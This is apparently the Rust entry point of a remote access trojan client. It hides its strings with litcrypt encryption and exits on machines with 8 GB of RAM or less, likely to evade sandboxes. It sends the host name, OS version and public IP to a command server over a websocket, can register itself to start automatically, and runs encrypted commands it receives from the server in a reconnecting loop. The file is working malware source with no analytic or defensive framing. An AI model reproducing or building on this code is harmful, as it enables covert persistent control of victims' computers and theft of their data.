//#![windows_subsystem = "windows"]

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

use std::env;
use base64::prelude::BASE64_STANDARD;
use base64::Engine;
use futures_util::StreamExt;
use serde::{Deserialize, Serialize};
use std::process::{exit, Command};
use std::time::Duration;
use auto_launch::{AutoLaunch, WindowsEnableMode};

mod commands {
    pub(crate) mod task_manager;
    pub(crate) mod command;
}

mod config;
mod utils;

use crate::commands::command::command::RPTCommand;
use crate::config::config::{get_auto_launch, get_myip_url, get_secure_data_key, get_startup_executable};
use crate::utils::utils::decrypt_data;
use config::config::get_host;
use sysinfo::System;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::client::IntoClientRequest;

#[derive(Deserialize, Debug, Default)]
pub struct MyIPData {
    pub ip: String,
    pub country: String,
    pub cc: String
}

#[derive(Serialize)]
pub struct HelloData {
    pub pc_name: String,
    pub win: String,
    pub ip: String,
    pub country: String,
    pub cc: String,
}

#[tokio::main]
async fn main() {
    let mut sys = System::new_all();
    sys.refresh_all();

    if (sys.total_memory()/1024/1024) <= 8000 {
        exit(0);
    }

    let ip = serde_json::from_str::<MyIPData>(reqwest::get(get_myip_url()).await.unwrap().text().await.unwrap().as_str()).unwrap_or_default();
    let info_data = HelloData {
        pc_name: System::host_name().unwrap_or_default(),
        win: System::os_version().unwrap_or_default(),
        ip: ip.ip,
        country: ip.country,
        cc: ip.cc,
    };

    let executable = get_startup_executable();
    if executable.starts_with("open::") {
        let id = executable.trim_start_matches("open::").to_string();
        Command::new("explorer")
            .arg(id)
            .spawn()
            .expect("Failed to send command");
    }

    if get_auto_launch() == true {
        let auto = AutoLaunch::new(env!("CARGO_BIN_NAME"), env::current_exe().expect("").to_str().unwrap(), WindowsEnableMode::Dynamic, &[] as &[&str]);
        auto.enable().expect("Failed to enable launcher");
    }
    loop {
        let formated_url = format!("ws://{}/invoke", get_host());
        let mut url = formated_url.into_client_request().unwrap_or_default();
        let encoded_data = BASE64_STANDARD.encode(serde_json::to_string_pretty(&info_data).unwrap());
        url.headers_mut().insert("X-Client-Info", encoded_data.parse().unwrap());
        match connect_async(url).await {
            Ok((ws_stream, _)) => {
                let (mut write, mut read) = ws_stream.split();
                while let Some(msg) = read.next().await {
                    match msg {
                        Ok(m) => {
                            if m.is_binary() {
                                // decoding message
                                let decrypted_data = decrypt_data(&m.into_data(), get_secure_data_key().as_bytes()).unwrap();
                                let text = String::from_utf8(decrypted_data).unwrap();
                                let command: RPTCommand = serde_json::from_str(&text).unwrap();
                                command.execute().await.expect("TODO: panic message");
                            }
                        }
                        Err(_) => {
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!("Websocket error: {}", e);
            }
        }

        tokio::time::sleep(Duration::from_secs(5)).await;
        println!("reconnecting...");
    }
}
